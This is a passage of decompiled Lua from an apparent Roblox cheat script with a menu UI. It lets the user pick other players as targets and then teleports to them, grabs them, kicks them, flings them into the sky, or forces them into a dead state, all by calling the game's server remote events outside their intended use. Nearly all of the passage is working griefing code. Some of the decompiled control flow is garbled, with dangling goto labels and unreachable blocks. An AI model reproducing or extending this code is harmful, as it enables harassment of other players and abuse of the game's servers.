r65_0.LocalPlayer = r65_0.Players.LocalPlayer
r25_0.TargetList = r65_0.TargetList
function getAllPlayers()
  -- line: [0, 0] id: 2
  local r0 = {}
  for r4, r5 in ipairs(r65_0.Players:GetPlayers()) do
    if r5 ~= r65_0.LocalPlayer then
      table.insert(r0, r5.Name)
    end
  end
  return r0
end
function refreshDropdown()
  -- line: [0, 0] id: 125
  if r65_0.targetPlayerDropdown then
    r65_0.targetPlayerDropdown:Refresh(getAllPlayers(), true)
  end
end
r65_0.targetPlayerDropdown = r63:AddDropdown({
  Name = "Select Player",
  Default = "",
  Options = getAllPlayers(),
  Callback = function(r0)
    -- line: [0, 0] id: 100
    r65_0.selectedPlayer = r65_0.Players:FindFirstChild(r0)
  end,
})
registerDropdown(r65_0.targetPlayerDropdown)
r63:AddButton({
  Name = "Add Selected Player to Target List",
  Callback = function()
    -- line: [0, 0] id: 183
    if r65_0.selectedPlayer and not r65_0.TargetList[r65_0.selectedPlayer.UserId] then
      r65_0.TargetList[r65_0.selectedPlayer.UserId] = r65_0.selectedPlayer.Name
      r31_0:MakeNotification({
        Name = "Player Added",
        Content = r65_0.selectedPlayer.Name .. " added to target list.",
        Time = 2,
      })
    end
  end,
})
r63:AddButton({
  Name = "Remove Selected Player from Target List",
  Callback = function()
    -- line: [0, 0] id: 226
    if r65_0.selectedPlayer and r65_0.TargetList[r65_0.selectedPlayer.UserId] then
      r65_0.TargetList[r65_0.selectedPlayer.UserId] = nil
      r31_0:MakeNotification({
        Name = "Player Removed",
        Content = r65_0.selectedPlayer.Name .. " removed from target list.",
        Time = 2,
      })
    end
  end,
})
function blobGrabPlayer(r0, r1)
  -- line: [0, 0] id: 130
  if r26_0 == 1 and r0.Character and r0.Character:FindFirstChild("HumanoidRootPart") then
    r1:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack({
      r1:FindFirstChild("LeftDetector"),
      r0.Character:FindFirstChild("HumanoidRootPart"),
      r1:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
    }))
    r26_0 = 2
  elseif r0.Character and r0.Character:FindFirstChild("HumanoidRootPart") then
    r1:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack({
      r1:FindFirstChild("RightDetector"),
      r0.Character:FindFirstChild("HumanoidRootPart"),
      r1:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
    }))
    r26_0 = 1
  end
end
function getMountedBlobman()
  -- line: [0, 0] id: 231
  local r0 = r1_0.Character
  if r0 then
    local r1 = r0:FindFirstChildOfClass("Humanoid")
    if r1 and r1.SeatPart and r1.SeatPart.Parent.Name == "CreatureBlobman" then
      return r1.SeatPart.Parent
    end
  end
  return nil
end
function teleportBlobman(r0, r1)
  -- line: [0, 0] id: 39
  local r2 = r1_0.Character and r1_0.Character:FindFirstChild("HumanoidRootPart")
  if not r2 then
    return 
  end
  local r3 = Instance.new("BodyPosition")
  r3.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
  r3.P = 100000
  r3.Position = r1
  r3.Parent = r0.PrimaryPart
  r2.CFrame = CFrame.new(r1)
  r0:SetPrimaryPartCFrame(CFrame.new(r1))
  task.wait(0.1)
  r3:Destroy()
end
function startGrabbingPlayers()
  -- line: [0, 0] id: 93
  task.spawn(function()
    -- line: [0, 0] id: 94
    while r14_0 do
      local r0 = nil
      for r4, r5 in pairs(r24_0:GetDescendants()) do
        if r5.Name == "CreatureBlobman" and r5:FindFirstChild("VehicleSeat") and r5.VehicleSeat:FindFirstChild("SeatWeld") and r5.VehicleSeat.SeatWeld.Part1:IsDescendantOf(r60_0.Character) then
          r0 = r5
          break
        end
      end
      if not r0 then
        r31_0:MakeNotification({
          Name = "Error",
          Content = "You must be mounted on a Blobman!",
          Time = 5,
        })
        r14_0 = false
        return 
      end
      for r4, r5 in pairs(r25_0.TargetList) do
        local r6 = r0_0:GetPlayerByUserId(r4)
        if r6 then
          blobGrabPlayer(r6, r0)
          task.wait(r25_0.BlobmanDelay or 0.1)
        end
      end
      task.wait(0.02)
    end
  end)
end
function attemptTeleportAndGrab(r0, r1, r2)
  -- line: [0, 0] id: 180
  if not (r1_0.Character and r1_0.Character:FindFirstChild("HumanoidRootPart")) or not r0.Character or not r0.Character:FindFirstChild("HumanoidRootPart") then
    return false
  end
  local r4 = r0.Character.HumanoidRootPart
  if (r4.Position - r2).Magnitude <= 20 then
    return true
  end
  teleportBlobman(r1, r4.Position + Vector3.new(0, 2, 0))
  task.wait(0.2)
  blobGrabPlayer(r0, r1)
  task.wait(0.2)
  teleportBlobman(r1, r2)
  task.wait(0.2)
  if (r4.Position - r2).Magnitude <= 20 then
    return true
  end
  return false
end
function startTeleportingPlayers()
  -- line: [0, 0] id: 208
  task.spawn(function()
    -- line: [0, 0] id: 209
    while r14_0 do
      local r0 = getMountedBlobman()
      local r1 = r1_0.Character and r1_0.Character:FindFirstChild("HumanoidRootPart")
      if r0 and r1 then
        local r2 = r1.Position
        for r6, r7 in pairs(r25_0.TargetList) do
          local r8 = r0_0:GetPlayerByUserId(r6)
          if r8 and r8.Character and r8.Character:FindFirstChild("HumanoidRootPart") and 20 < (r8.Character.HumanoidRootPart.Position - r2).Magnitude then
            local r9 = false
            local r10 = 0
            while r14_0 and not r9 and r10 < 3 do
              local r11 = attemptTeleportAndGrab(r8, r0, r2)
              r9 = r11
              r10 = r10 + 1
              if not r9 then
                task.wait(0.5)
              end
            end
          end
        end
      end
      task.wait(0.2)
    end
  end)
end
r63:AddToggle({
  Name = "Blobman Target (If you are in safe zone/void)",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 124
    r14_0 = r0
    if r0 then
      startGrabbingPlayers()
      startTeleportingPlayers()
    end
  end,
})
function findGroundBelow(r0)
  -- line: [0, 0] id: 216
  local r1 = RaycastParams.new()
  r1.FilterDescendantsInstances = {
    r65_0.LocalPlayer.Character
  }
  r1.FilterType = Enum.RaycastFilterType.Blacklist
  local r2 = r65_0.Workspace:Raycast(r0 + Vector3.new(0, 50, 0), Vector3.new(0, -400), r1)
  if r2 then
    local r3 = r2.Position or r0
  else
    goto label_35	-- block#2 is visited secondly
  end
  return r3
end
function spawnBlobman()
  -- line: [0, 0] id: 37
  local r0 = r65_0.LocalPlayer.Character and r65_0.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
  if not r0 then
    return nil
  end
  local r2_37 = CFrame.new(findGroundBelow(r0.Position) + Vector3.new(0, 3, 0))
  pcall(function()
    -- line: [0, 0] id: 38
    r65_0.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", r2_37, Vector3.new(0, 59.667, 0))
  end)
  local r3 = r65_0.LocalPlayer.Name .. "SpawnedInToys"
  for r7 = 1, 30, 1 do
    local r8 = r65_0.Workspace:FindFirstChild(r3)
    if r8 then
      local r9 = r8:FindFirstChild("CreatureBlobman")
      if r9 then
        r65_0.blobalter = 1
        return r9
      end
    end
    task.wait(0.15)
  end
  return nil
end
function findExistingBlobman()
  -- line: [0, 0] id: 85
  local r0 = r65_0.Workspace:FindFirstChild(r65_0.LocalPlayer.Name .. "SpawnedInToys")
  local r1 = nil	-- notice: implicit variable refs by block#[3]
  if r0 then
    r1 = r0:FindFirstChild("CreatureBlobman")
    if not r1 then
      ::label_16::
      r1 = nil
    end
  else
    goto label_16	-- block#2 is visited secondly
  end
  return r1
end
function getMountedBlobman()
  -- line: [0, 0] id: 60
  local r0 = r65_0.LocalPlayer.Character
  if not r0 then
    return nil
  end
  local r1 = r0:FindFirstChildOfClass("Humanoid")
  if r1 and r1.SeatPart and r1.SeatPart.Parent and r1.SeatPart.Parent.Name == "CreatureBlobman" then
    return r1.SeatPart.Parent
  end
  return nil
end
function seatOnBlobman(r0)
  -- line: [0, 0] id: 15
  if not r0 or not r65_0.LocalPlayer.Character then
    return 
  end
  local r1 = r65_0.LocalPlayer.Character
  local r2_15 = r1:FindFirstChildOfClass("Humanoid")
  local r3 = r1:FindFirstChild("HumanoidRootPart")
  if not r2_15 or not r3 then
    return 
  end
  local r4_15 = r0:FindFirstChild("VehicleSeat")
  if r4_15 and r4_15:IsA("VehicleSeat") then
    r3.CFrame = r4_15.CFrame + Vector3.new(0, 2, 0)
    pcall(function()
      -- line: [0, 0] id: 16
      r4_15:Sit(r2_15)
    end)
    task.wait(0.25)
  end
end
function teleportBlobman(r0_189, r1_189)
  -- line: [0, 0] id: 189
  if not r0_189 or not r0_189.PrimaryPart then
    return 
  end
  local r2 = r65_0.LocalPlayer.Character
  if not r2 then
    return 
  end
  local r3_189 = r2:FindFirstChild("HumanoidRootPart")
  if not r3_189 then
    return 
  end
  local r4 = Instance.new("BodyPosition")
  r4.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
  r4.P = 100000
  r4.Position = r1_189
  r4.Parent = r0_189.PrimaryPart
  pcall(function()
    -- line: [0, 0] id: 190
    r3_189.CFrame = CFrame.new(r1_189)
    r0_189:SetPrimaryPartCFrame(CFrame.new(r1_189))
  end)
  task.wait(0.1)
  if r4 and r4.Parent then
    r4:Destroy()
  end
end
function blobGrabPlayer(r0_12, r1)
  -- line: [0, 0] id: 12
  if not r0_12 or not r1 then
    return 
  end
  if not r0_12.Character or not r0_12.Character:FindFirstChild("HumanoidRootPart") then
    return 
  end
  local r2_12 = r1:FindFirstChild("LeftDetector")
  local r3_12 = r1:FindFirstChild("RightDetector")
  local r4 = r1:FindFirstChild("BlobmanSeatAndOwnerScript")
  if not r4 then
    return 
  end
  local r5_12 = r4:FindFirstChild("CreatureGrab")
  if not r5_12 then
    return 
  end
  if r65_0.blobalter == 1 then
    local r6_12 = r2_12 and r2_12:FindFirstChild("LeftWeld")
    if r2_12 and r6_12 then
      pcall(function()
        -- line: [0, 0] id: 13
        r5_12:FireServer(r2_12, r0_12.Character.HumanoidRootPart, r6_12)
      end)
      r65_0.blobalter = 2
    end
    -- close: r6
  else
    local r6_12 = r3_12 and r3_12:FindFirstChild("RightWeld")
    if r3_12 and r6_12 then
      pcall(function()
        -- line: [0, 0] id: 14
        r5_12:FireServer(r3_12, r0_12.Character.HumanoidRootPart, r6_12)
      end)
      r65_0.blobalter = 1
    end
    -- close: r6
  end
end
function attemptTeleportAndGrab(r0, r1, r2, r3)
  -- line: [0, 0] id: 207
  if not r3 then
    r3 = 20
  end
  if not r0 or not r1 or not r2 then
    return false
  end
  if not r0.Character or not r0.Character:FindFirstChild("HumanoidRootPart") then
    return false
  end
  local r4 = r0.Character.HumanoidRootPart
  local r5 = (r4.Position - r2).Magnitude
  if r65_0.ORIGIN_POS and r65_0.MAX_TELEPORT_DIST < (r4.Position - r65_0.ORIGIN_POS).Magnitude then
    return false
  end
  if r5 <= r3 then
    blobGrabPlayer(r0, r1)
    task.wait(0.1)
    return true
  end
  teleportBlobman(r1, r4.Position + Vector3.new(0, 2, 0))
  task.wait(0.2)
  blobGrabPlayer(r0, r1)
  task.wait(0.2)
  teleportBlobman(r1, r2)
  task.wait(0.2)
  if not r0.Character or not r0.Character:FindFirstChild("HumanoidRootPart") then
    return false
  end
  return (r0.Character.HumanoidRootPart.Position - r2).Magnitude <= r3
end
function blobDropAndRegrabCycle(r0, r1, r2)
  -- line: [0, 0] id: 165
  if not r0 or not r0.Character or not r1 or not r1.Parent then
    return 
  end
  local r3_165 = r0.Character:FindFirstChild("HumanoidRootPart")
  if not r3_165 then
    return 
  end
  local r4 = r1:FindFirstChild("BlobmanSeatAndOwnerScript")
  if not r4 then
    return 
  end
  local r5_165 = r4:FindFirstChild("CreatureDrop")
  local r6 = r4:FindFirstChild("CreatureGrab")
  if not r5_165 or not r6 then
    return 
  end
  for r10 = 1, 4, 1 do
    if not r65_0.toggleEnabled then
      break
    else
      local r11 = r2
      if r11 then
        r11 = r65_0.LocalPlayer.Character
        if r11 then
          r11 = r65_0.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and (r65_0.LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new())
        else
          goto label_66	-- block#19 is visited secondly
        end
      end
      r11 = r11 + Vector3.new(0, 10 * r10, 0)
      if r1 and r1.PrimaryPart then
        teleportBlobman(r1, r11)
      end
      task.wait(0.1)
      local r12 = r1:FindFirstChild("LeftDetector")
      local r13 = r1:FindFirstChild("RightDetector")
      local r14_165 = r12 and (r12:FindFirstChild("RigidConstraint") or r12:FindFirstChild("LeftWeld"))
      local r15_165 = r13 and (r13:FindFirstChild("RightWeld") or r13:FindFirstChild("RigidConstraint"))
      if r14_165 then
        pcall(function()
          -- line: [0, 0] id: 167
          r5_165:FireServer(r14_165, r3_165)
        end)
      end
      if r15_165 then
        pcall(function()
          -- line: [0, 0] id: 166
          r5_165:FireServer(r15_165, r3_165)
        end)
      end
      task.wait(0.1)
      blobGrabPlayer(r0, r1)
      task.wait(0.1)
      -- close: r11
    end
  end
end
function masterLoop()
  -- line: [0, 0] id: 104
  if r65_0.masterRunning then
    return 
  end
  r65_0.masterRunning = true
  local r0 = r65_0.LocalPlayer.Character
  local r1 = r0 and r0:FindFirstChild("HumanoidRootPart")
  if r1 then
    r65_0.ORIGIN_POS = r1.Position
  end
  r25_0.LastProcessed = r25_0.LastProcessed or {}
  task.spawn(function()
    -- line: [0, 0] id: 105
    while r65_0.toggleEnabled do
      local r0 = r65_0.currentBlobman
      if r0 then
        r0 = r65_0.currentBlobman
        if r0 then
          r0 = r65_0.currentBlobman.Parent
          if not r0 then
            ::label_17::
            r0 = r65_0
            r0.currentBlobman = findExistingBlobman()
          end
        end
      else
        goto label_17	-- block#4 is visited secondly
      end
      r0 = r65_0.currentBlobman
      if r0 then
        r0 = r65_0.currentBlobman
        if r0 then
          r0 = r65_0.currentBlobman.Parent
          if not r0 then
            ::label_34::
            r0 = spawnBlobman()
            if r0 then
              r65_0.currentBlobman = r0
              task.wait(0.25)
            end
          end
        end
      else
        goto label_34	-- block#8 is visited secondly
      end
      r0 = r65_0.currentBlobman
      if r0 then
        r0 = r65_0.currentBlobman.Parent
        if r0 then
          r0 = getMountedBlobman()
          if not r0 or r0 ~= r65_0.currentBlobman then
            local r1 = os.clock()
            while true do
              if r65_0.toggleEnabled then
                if r0 then
                  local r2 = r65_0.currentBlobman
                  if r0 ~= r2 then
                    ::label_74::
                    seatOnBlobman(r65_0.currentBlobman)
                    task.wait(0.25)
                    r0 = getMountedBlobman()
                    r2 = r65_0.currentBlobman
                    if r0 ~= r2 then
                      r2 = os.clock() - r1
                      if r2 >= 5 then
                        break
                      end
                    end
                  end
                else
                  goto label_74	-- block#18 is visited secondly
                end
              end
            end
            local r2 = spawnBlobman()
            if r2 then
              r65_0.currentBlobman = r2
              task.wait(0.3)
              for r6 = 1, 6, 1 do
                if r65_0.toggleEnabled then
                  seatOnBlobman(r65_0.currentBlobman)
                  task.wait(0.25)
                  r0 = getMountedBlobman()
                  if r0 ~= r65_0.currentBlobman then
                  end
                end
              end
            end
          end
          if getMountedBlobman() == r65_0.currentBlobman then
            local r1 = r65_0.LocalPlayer.Character
            local r2 = r1 and r1:FindFirstChild("HumanoidRootPart")
            if r2 then
              local r3_105 = r2.Position
              local r4 = {}
              if r65_0.teleportAllEnabled then
                for r8, r9 in ipairs(r65_0.Players:GetPlayers()) do
                  if r9 ~= r65_0.LocalPlayer then
                    table.insert(r4, r9)
                  end
                end
              else
                for r8, r9 in pairs(r65_0.TargetList) do
                  local r10 = r65_0.Players:GetPlayerByUserId(r8)
                  if r10 then
                    table.insert(r4, r10)
                  end
                end
              end
              for r8, r9_105 in ipairs(r4) do
                if r65_0.toggleEnabled then
                  if r9_105 and r9_105.Character and r9_105.Character:FindFirstChild("HumanoidRootPart") then
                    if r25_0.LastProcessed[r9_105.UserId] then
                      local r10 = r9_105.Character and r9_105.Character:FindFirstChild("HumanoidRootPart")
                      local r11 = r9_105.Character and r9_105.Character:FindFirstChild("Humanoid")
                      if not r10 or not r11 or 0 >= r11.Health or (r10.Position - r3_105).Magnitude > 20 then
                        r25_0.LastProcessed[r9_105.UserId] = nil
                      end
                    end
                    if r65_0.ORIGIN_POS and r65_0.MAX_TELEPORT_DIST >= (r9_105.Character.HumanoidRootPart.Position - r65_0.ORIGIN_POS).Magnitude then
                      if (r9_105.Character.HumanoidRootPart.Position - r3_105).Magnitude > 20 then
                        local r12 = false
                        local r13 = 0
                        while r65_0.toggleEnabled and not r12 and r13 < 3 do
                          local r14 = r65_0.currentBlobman
                          if r14 then
                            r14 = r65_0.currentBlobman.Parent
                            if r14 then
                              r14 = getMountedBlobman()
                              if r14 == r65_0.currentBlobman then
                                r14 = attemptTeleportAndGrab(r9_105, r65_0.currentBlobman, r3_105, 20)
                                r12 = r14
                                r13 = r13 + 1
                                if r12 then
                                  pcall(function()
                                    -- line: [0, 0] id: 106
                                    blobDropAndRegrabCycle(r9_105, r65_0.currentBlobman, r3_105)
                                  end)
                                  r14 = r25_0.LastProcessed
                                  r14[r9_105.UserId] = tick()
                                else
                                  task.wait(0.4)
                                end
                              else
                                break
                              end
                            else
                              break
                            end
                          else
                            break
                          end
                        end
                      else
                        blobGrabPlayer(r9_105, r65_0.currentBlobman)
                        task.wait(r25_0.BlobmanDelay or 0.1)
                        pcall(function()
                          -- line: [0, 0] id: 107
                          blobDropAndRegrabCycle(r9_105, r65_0.currentBlobman, r3_105)
                        end)
                        r25_0.LastProcessed[r9_105.UserId] = tick()
                      end
                    end
                  end
                  -- close: r8
                else
                  break
                end
              end
              -- close: r3
            end
          end
        end
      end
      task.wait(0.25)
    end
    r65_0.masterRunning = false
  end)
end
r65_0.LocalPlayer.CharacterAdded:Connect(function()
  -- line: [0, 0] id: 82
  if r65_0.toggleEnabled then
    task.wait(1.5)
    local r0 = r65_0.LocalPlayer.Character and r65_0.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if r0 then
      r65_0.ORIGIN_POS = r0.Position
    end
    masterLoop()
  end
end)
r63:AddToggle({
  Name = "Blobman Target (Kick)",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 154
    r65_0.toggleEnabled = r0
    if r0 then
      local r1 = r65_0.LocalPlayer.Character and r65_0.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
      if r1 then
        r65_0.ORIGIN_POS = r1.Position
      end
      masterLoop()
    end
  end,
})
r63:AddSlider({
  Name = "Teleport Duration",
  Min = 0.25,
  Max = 3,
  Default = r65_0.teleportDelay,
  Increment = 0.01,
  ValueName = "Seconds",
  Callback = function(r0)
    -- line: [0, 0] id: 196
    r65_0.teleportDelay = r0
  end,
})
r65_0.Players.PlayerAdded:Connect(refreshDropdown)
r65_0.Players.PlayerRemoving:Connect(refreshDropdown)
local r66_0 = {
  autoGrab = false,
  autoGrabCoroutine = nil,
}
function grabDual(r0, r1_68)
  -- line: [0, 0] id: 68
  local r2_68 = r0:FindFirstChild("LeftDetector")
  local r3_68 = r0:FindFirstChild("RightDetector")
  local r4_68 = r0:FindFirstChild("BlobmanSeatAndOwnerScript")
  if not r2_68 or not r3_68 or not r4_68 or not r1_68 then
    return 
  end
  local r5_68 = r2_68:FindFirstChild("RigidConstraint")
  local r6_68 = r3_68:FindFirstChild("RightWeld")
  if r5_68 then
    pcall(function()
      -- line: [0, 0] id: 70
      r4_68.CreatureGrab:FireServer(r2_68, r1_68, r5_68)
      r4_68.CreatureDrop:FireServer(r5_68, r1_68)
    end)
  end
  if r6_68 then
    pcall(function()
      -- line: [0, 0] id: 69
      r4_68.CreatureGrab:FireServer(r3_68, r1_68, r6_68)
      r4_68.CreatureDrop:FireServer(r6_68, r1_68)
    end)
  end
end
function getMyBlobman()
  -- line: [0, 0] id: 74
  for r3, r4 in pairs(r24_0:GetDescendants()) do
    if r4:IsA("Model") and r4.Name == "CreatureBlobman" and r4:FindFirstChild("VehicleSeat") then
      local r5 = r4.VehicleSeat:FindFirstChild("SeatWeld")
      if r5 and r5.Part1 and r5.Part1:IsDescendantOf(game.Players.LocalPlayer.Character) then
        return r4
      end
    end
  end
  return nil
end
function loopTargetedGrab()
  -- line: [0, 0] id: 144
  r66_0.autoGrabCoroutine = coroutine.create(function()
    -- line: [0, 0] id: 145
    local r0 = getMyBlobman()
    if not r0 then
      r31_0:MakeNotification({
        Name = "No Blobman Found",
        Content = "You must be riding a Blobman to use this.",
        Image = "rbxassetid://4483345998",
        Time = 5,
      })
      return 
    end
    while r66_0.autoGrab do
      local r1 = pairs
      for r4, r5 in r1(r25_0.TargetList) do
        if r4 ~= game.Players.LocalPlayer.UserId then
          local r6 = game.Players:GetPlayerByUserId(r4)
          local r7 = r6 and r6.Character and r6.Character:FindFirstChild("HumanoidRootPart")
          if r7 then
            grabDual(r0, r7)
          end
        end
      end
      task.wait(0.01)
    end
  end)
  coroutine.resume(r66_0.autoGrabCoroutine)
end
r63:AddToggle({
  Name = "God Loop Target",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 11
    r66_0.autoGrab = r0
    if r0 then
      loopTargetedGrab()
    elseif r66_0.autoGrabCoroutine then
      coroutine.close(r66_0.autoGrabCoroutine)
      r66_0.autoGrabCoroutine = nil
    end
  end,
})
local r67_0 = {
  enabled = false,
  coroutine = nil,
  MAX_HOVER_DIST = 500,
  HOVER_HEIGHT = 25,
}
function hoverFollowTarget()
  -- line: [0, 0] id: 25
  r67_0.coroutine = coroutine.create(function()
    -- line: [0, 0] id: 26
    while r67_0.enabled do
      local r0 = getMountedBlobman()
      local r1 = r65_0.selectedPlayer
      if r0 and r1 and r1.Character and r1.Character:FindFirstChild("HumanoidRootPart") then
        local r2 = r1.Character.HumanoidRootPart
        local r3 = r65_0.LocalPlayer.Character
        local r4 = r3 and r3:FindFirstChild("HumanoidRootPart")
        if r4 and (r4.Position - r2.Position).Magnitude <= r67_0.MAX_HOVER_DIST then
          teleportBlobman(r0, r2.Position + Vector3.new(0, r67_0.HOVER_HEIGHT, 0))
        end
      end
      task.wait(0.06)
    end
  end)
  coroutine.resume(r67_0.coroutine)
end
r63:AddToggle({
  Name = "Hover above target",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 195
    r67_0.enabled = r0
    if r0 then
      hoverFollowTarget()
    elseif r67_0.coroutine then
      coroutine.close(r67_0.coroutine)
      r67_0.coroutine = nil
    end
  end,
})
local r68 = r32:MakeTab({
  Name = "Auras",
  Icon = "rbxassetid://6031075939",
  PremiumOnly = false,
})
local r69 = r68:AddSection({
  Name = "Auras",
})
local r70_0 = {
  auraCoroutine = nil,
  gravityCoroutine = nil,
  localPlayer = game.Players.LocalPlayer,
  Players = game.Players,
  Debris = game:GetService("Debris"),
  SetNetworkOwner = game.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
  OrionLib = r31_0,
  Tab = r68,
  auraRadius = 25,
}
function startAirSuspendAura()
  -- line: [0, 0] id: 148
  r70_0.auraCoroutine = coroutine.create(function()
    -- line: [0, 0] id: 149
    -- notice: unreachable block#3
    while true do
      local r0, r1 = pcall(function()
        -- line: [0, 0] id: 150
        local r0 = r70_0.localPlayer.Character
        if r0 and r0:FindFirstChild("Head") and r0:FindFirstChild("HumanoidRootPart") then
          local r1 = r0.Head
          local r2_150 = r0.HumanoidRootPart
          for r6, r7_150 in pairs(r70_0.Players:GetPlayers()) do
            coroutine.wrap(function()
              -- line: [0, 0] id: 151
              if r7_150 ~= r70_0.localPlayer and r7_150.Character then
                local r0 = r7_150.Character
                local r1 = r0:FindFirstChild("Torso")
                if r1 and (r1.Position - r2_150.Position).Magnitude <= r70_0.auraRadius then
                  r70_0.SetNetworkOwner:FireServer(r1, r0.HumanoidRootPart.FirePlayerPart.CFrame)
                  task.wait(0.1)
                  local r3 = r1:FindFirstChild("l") or Instance.new("BodyVelocity", r1)
                  r3.Name = "l"
                  r3.Velocity = Vector3.new(0, 200000000000, 0)
                  r3.MaxForce = Vector3.new(0, math.huge, 0)
                  r70_0.Debris:AddItem(r3, 100)
                  task.wait(1)
                  r70_0.SetNetworkOwner:FireServer(r1, nil)
                  if r3 then
                    r3:Destroy()
                  end
                end
              end
            end)()
            -- close: r6
          end
          -- close: r1
        end
      end)
      if not r0 then
        warn("Error in Air Suspend Aura: " .. tostring(r1))
      end
      task.wait(0.02)
    end
  end)
  coroutine.resume(r70_0.auraCoroutine)
end
function stopAirSuspendAura()
  -- line: [0, 0] id: 172
  if r70_0.auraCoroutine then
    coroutine.close(r70_0.auraCoroutine)
    r70_0.auraCoroutine = nil
  end
end
r70_0.Tab:AddToggle({
  Name = " Launch Aura",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 80
    if r0 then
      startAirSuspendAura()
    else
      stopAirSuspendAura()
    end
  end,
})
r70_0.localPlayer.CharacterAdded:Connect(function(r0)
  -- line: [0, 0] id: 147
  r70_0.playerCharacter = r0
end)
function startHellSendAura()
  -- line: [0, 0] id: 119
  r70_0.gravityCoroutine = coroutine.create(function()
    -- line: [0, 0] id: 120
    -- notice: unreachable block#3
    while true do
      local r0, r1 = pcall(function()
        -- line: [0, 0] id: 121
        local r0 = r70_0.localPlayer.Character
        if r0 and r0:FindFirstChild("HumanoidRootPart") then
          local r1 = r0.HumanoidRootPart
          local r2 = r24_0.CurrentCamera
          for r6, r7 in pairs(r70_0.Players:GetPlayers()) do
            if r7 ~= r70_0.localPlayer and r7.Character then
              local r8 = r7.Character
              local r9 = r8:FindFirstChild("Torso")
              if r9 and (r9.Position - r1.Position).Magnitude <= r70_0.auraRadius then
                r70_0.SetNetworkOwner:FireServer(r9, r1.CFrame)
                for r14, r15 in ipairs(r8:GetDescendants()) do
                  if r15:IsA("BasePart") then
                    r15.CanCollide = false
                  end
                end
                local r11 = r9:FindFirstChild("HellAuraPos") or Instance.new("BodyPosition")
                r11.Name = "HellAuraPos"
                r11.MaxForce = Vector3.new(100000, 100000, 100000)
                r11.D = 500
                r11.P = 50000
                r11.Parent = r9
                local r12 = r9:FindFirstChild("HellAuraGyro") or Instance.new("BodyGyro")
                r12.Name = "HellAuraGyro"
                r12.MaxTorque = Vector3.new(100000, 100000, 100000)
                r12.D = 500
                r12.P = 50000
                r12.Parent = r9
                r11.Position = r1.Position + r2.CFrame.LookVector * 15 + Vector3.new(0, 5, 0)
                r12.CFrame = CFrame.new(r9.Position, r1.Position)
              end
            end
          end
        end
      end)
      if not r0 then
        warn("Error in Hell Send Aura: " .. tostring(r1))
      end
      task.wait(0.05)
    end
  end)
  coroutine.resume(r70_0.gravityCoroutine)
end
function stopHellSendAura()
  -- line: [0, 0] id: 158
  if r70_0.gravityCoroutine then
    coroutine.close(r70_0.gravityCoroutine)
    r70_0.gravityCoroutine = nil
  end
end
r70_0.Tab:AddToggle({
  Name = "Telekinesis Aura",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 4
    if r0 then
      startHellSendAura()
    else
      stopHellSendAura()
    end
  end,
})
function death(r0)
  -- line: [0, 0] id: 76
  if deathConnection then
    deathConnection:Disconnect()
  end
  if not r0 then
    r25_0.Death_Aura = false
    return 
  end
  r25_0.Death_Aura = true
  deathConnection = r2_0.Heartbeat:Connect(function()
    -- line: [0, 0] id: 77
    for r3, r4 in ipairs(r0_0:GetPlayers()) do
      if r4 ~= r1_0 and r4.Character then
        local r5_77 = r4.Character:FindFirstChild("HumanoidRootPart")
        local r6_77 = r4.Character:FindFirstChild("Head")
        local r7_77 = r4.Character:FindFirstChildOfClass("Humanoid")
        if r5_77 and r6_77 and r7_77 and 0 < r7_77.Health and (r5_77.Position - r1_0.Character.HumanoidRootPart.Position).Magnitude <= 25 then
          pcall(function()
            -- line: [0, 0] id: 78
            r6_0.SetNetworkOwner:FireServer(r5_77, r5_77.CFrame)
            task.wait(0.1)
            r6_0.DestroyGrabLine:FireServer(r5_77)
            if r6_77:FindFirstChild("PartOwner") and r6_77.PartOwner.Value == r1_0.Name then
              for r3, r4 in pairs(r7_77.Parent:GetChildren()) do
                if r4:IsA("BasePart") then
                  r4.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                end
              end
              task.wait()
              for r3, r4 in pairs(r7_77.Parent:GetChildren()) do
                if r4:IsA("BasePart") then
                  r4.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                end
              end
              local r0_78 = Instance.new("BodyVelocity")
              r0_78.Velocity = Vector3.new(0, -9999999, 0)
              r0_78.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
              r0_78.P = 100000075
              r0_78.Parent = r5_77
              r7_77.Sit = false
              r7_77.Jump = true
              r7_77.BreakJointsOnDeath = false
              r7_77:ChangeState(Enum.HumanoidStateType.Dead)
              task.delay(2, function()
                -- line: [0, 0] id: 79
                if r0_78 and r0_78.Parent then
                  r0_78:Destroy()
                end
              end)
              -- close: r0
            end
          end)
        end
        -- close: r5
      end
    end
  end)
end
r68:AddToggle({
  Name = "Death Aura",
  Default = false,
  Callback = death,
})
local r71 = r32:MakeTab({
  Name = "Teleport",
  Icon = "rbxassetid://6031068433",
  PremiumOnly = false,
})
local r72 = r71:AddSection({
  Name = "Teleport",
})
local r73_0 = false
local r74_0 = nil
function getAllPlayers()
  -- line: [0, 0] id: 174
  local r0 = {}
  for r4, r5 in pairs(r0_0:GetPlayers()) do
    if r5 ~= r1_0 then
      table.insert(r0, r5.Name)
    end
  end
  return r0
end
function updateDropdownOptions(r0)
  -- line: [0, 0] id: 221
  r0:Refresh(getAllPlayers(), true)
end
local r75_0 = r71:AddDropdown({
  Name = "Select Player",
  Default = nil,
  Options = getAllPlayers(),
  Callback = function(r0)
    -- line: [0, 0] id: 175
    r28_0 = r0
  end,
})
updateDropdownOptions(r75_0)
function teleportToPlayer()
  -- line: [0, 0] id: 102
  if r28_0 then
